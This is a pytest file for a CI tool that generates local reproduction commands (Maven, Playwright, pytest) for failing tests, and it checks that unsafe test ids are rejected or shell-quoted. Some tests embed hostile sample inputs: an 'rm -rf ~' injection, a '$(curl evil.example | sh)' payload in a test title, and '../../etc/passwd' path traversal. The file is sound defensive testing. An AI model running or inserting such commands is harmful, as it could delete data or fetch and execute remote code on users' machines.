"""Local repro commands: from the repository's planners for Java, from the spec path for
Playwright and the node id for pytest, and none at all for an id that is not a plain
name or path."""

import shlex
import sys
from pathlib import Path

SCRIPTS = Path(__file__).parents[1]
sys.path.insert(0, str(SCRIPTS))

from ci_ai import bundle, repro  # noqa: E402

REPO = SCRIPTS.parents[1]


def blocking(test_id, suite, **fields):
    return bundle.BlockingTest(test_id=test_id, gate_class="introduced", entry="3/3 failed", parent="0/3 failed", fingerprint="f", suite=suite, **fields)


def test_java_it_command_comes_from_the_real_planner_narrowed_to_the_method():
    test = blocking("org.openmetadata.it.tests.TableResourceIT#patch_tableOwners_200(TestNamespace)", "java-it", profile="postgres-opensearch", lane="parallel")

    [result] = repro.repros_for([test], REPO)

    assert result.commands, result.note
    argv = shlex.split(result.commands[0])
    assert argv[:3] == ["mvn", "-B", "verify"]
    assert "-Dit.test=TableResourceIT#patch_tableOwners_200" in argv
    assert any(arg.startswith("-P") for arg in argv) and "-Dfailsafe.failIfNoSpecifiedTests=false" in argv
    assert result.note == "failed in CI on `postgres-opensearch`, lane `parallel`"


def test_a_class_the_trusted_checkout_lacks_falls_back_to_the_planner_invocation():
    test = blocking("org.openmetadata.it.tests.ThisClassDoesNotExistAnywhereIT#t", "java-it")

    [result] = repro.repros_for([test], REPO)

    assert shlex.split(result.commands[0]) == [
        "python3",
        ".github/scripts/plan_local_java_tests.py",
        "--add-it=ThisClassDoesNotExistAnywhereIT",
        "--reason",
        repro.PLANNER_REASON,
    ]
    assert "run on the PR branch" in result.note


def test_unit_tests_ask_the_planner_for_a_unit_command_once_per_class():
    calls = []

    def planner(flag, name, root):
        calls.append((flag, name))
        return [
            {"kind": "unit", "label": "service", "command": f"mvn -B package -pl openmetadata-service -am -Dtest={name} -Dsurefire.failIfNoSpecifiedTests=false"},
            {"kind": "integration", "label": "x", "command": "mvn verify"},
        ]

    tests = [blocking("org.openmetadata.service.util.JsonUtilsTest#a", "java"), blocking("org.openmetadata.service.util.JsonUtilsTest#b", "java")]

    results = repro.repros_for(tests, REPO, planner=planner)

    assert calls == [("--add-unit", "JsonUtilsTest")]
    assert [[shlex.split(command) for command in r.commands] for r in results] == [
        [["mvn", "-B", "package", "-pl", "openmetadata-service", "-am", "-Dtest=JsonUtilsTest#a", "-Dsurefire.failIfNoSpecifiedTests=false"]],
        [["mvn", "-B", "package", "-pl", "openmetadata-service", "-am", "-Dtest=JsonUtilsTest#b", "-Dsurefire.failIfNoSpecifiedTests=false"]],
    ]


def test_a_class_name_that_is_not_an_identifier_gets_no_command_and_no_planner_call():
    def planner(flag, name, root):
        raise AssertionError("the planner must not see this name")

    [result] = repro.repros_for([blocking("org.openmetadata.x.Foo;rm -rf ~#t", "java-it")], REPO, planner=planner)

    assert result.commands == [] and result.note


def test_playwright_command_quotes_a_hostile_title_safely():
    title = "Glossary › it's $(curl evil.example | sh) `id`"
    test = blocking(f"chromium :: Pages/Glossary.spec.ts :: {title}", "playwright")

    [result] = repro.repros_for([test], REPO)

    prefix = f"cd {repro.UI_DIR} && "
    assert result.commands[0].startswith(prefix)
    argv = shlex.split(result.commands[0][len(prefix) :])
    assert argv[:4] == ["npx", "playwright", "test", "Pages/Glossary.spec.ts"]
    assert "--project=chromium" in argv and "--retries=0" in argv
    grep = argv[argv.index("-g") + 1]
    assert grep == "it's\\ \\$\\(curl\\ evil\\.example\\ \\|\\ sh\\)\\ `id`"


def test_playwright_ids_that_leave_the_repository_get_no_command():
    for test_id in ("chromium :: ../../etc/passwd.ts :: t", "chromium :: /abs/x.spec.ts :: t", "chro mium :: a.spec.ts :: t", "no separators"):
        [result] = repro.repros_for([blocking(test_id, "playwright")], REPO)
        assert result.commands == [], test_id


def test_python_command_uses_the_node_id_found_in_the_checkout(tmp_path):
    (tmp_path / "ingestion/tests/unit").mkdir(parents=True)
    (tmp_path / "ingestion/tests/unit/test_x.py").write_text("def test_a(): pass\n")

    [found, missing] = repro.repros_for(
        [blocking("tests.unit.test_x.TestY#test_a[param]", "python"), blocking("tests.unit.gone.TestY#test_a", "python")], tmp_path
    )

    assert found.commands == ["cd ingestion && python -m pytest tests/unit/test_x.py::TestY::test_a -p no:randomly"]
    assert missing.commands == [] and missing.note
